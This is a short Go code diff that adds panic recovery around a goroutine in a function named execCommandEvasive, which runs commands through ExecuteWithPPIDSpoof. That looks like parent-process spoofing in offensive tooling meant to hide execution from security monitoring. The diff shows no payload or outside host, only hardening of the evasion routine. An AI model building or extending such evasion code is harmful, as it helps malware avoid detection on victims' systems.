@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"fmt"
 	"os/exec"
 	"runtime"
 	"time"
@@ -34,6 +35,11 @@ func execCommandEvasive(command string) ([]byte, error) {
 				}
 				ch := make(chan ppidResult, 1)
 				go func() {
+					defer func() {
+						if rec := recover(); rec != nil {
+							ch <- ppidResult{nil, fmt.Errorf("ppid: %v", rec)}
+						}
+					}()
 					o, e := ExecuteWithPPIDSpoof(command, ppid)
 					ch <- ppidResult{o, e}
 				}()
